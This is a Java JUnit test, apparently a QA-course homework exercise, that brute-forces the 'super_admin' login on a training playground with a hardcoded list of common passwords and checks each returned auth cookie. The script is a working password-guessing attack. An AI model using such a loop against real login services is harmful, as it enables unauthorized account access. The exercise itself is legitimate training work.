import io.restassured.RestAssured;

import io.restassured.response.Response;
import org.junit.jupiter.api.Test;


import java.util.HashMap;
import java.util.Map;

public class Ex_9 {

    @Test
    public void get_secret_password_homework() {

        boolean doRequest = true;
        String urlAuth = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String urlCheckCookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";


        String[] pass = {"password", "123456", "123456789", "12345", "123456789", "qwerty",
                "abc123", "football", "1234567", "monkey", "111111", "letmein",
                "1234", "1234567890", "dragon", "baseball", "sunshine", "123qwe",
                "iloveyou", "trustno1", "princess", "adobe123",
                "123123", "welcome", "login", "admin", "solo",
                "1q2w3e4r", "master", "666666",
                "photoshop", "1qaz2wsx", "qwertyuiop",
                "ashley", "1234", "mustang", "121212", "starwars", "654321",
                "bailey", "access", "flower", "555555",
                "passw0rd", "shadow", "lovely",
                "7777777",
                "michael", "!@#$%^&*",
                "jesus", "password1", "superman", "hello", "charlie", "888888",
                "696969", "hottie", "freedom", "aa123456",
                "qazwsx", "ninja", "azerty", "solo", "loveme", "whatever", "donald",
                "batman", "zaq1zaq1",
                "000000", "qwerty123"};

        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");


        for (String s : pass) {
            data.put("password", s);


            Response result = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post(urlAuth)
                    .andReturn();

            String responseCookie = result.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);


            Response authCookie = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .patch(urlCheckCookie)
                    .andReturn();
            String answer = authCookie.asString();

            if (answer.equals("You are authorized")) {
                System.out.println("Пароль " + s + " верный!");
                break;
            }

        }
    }
}
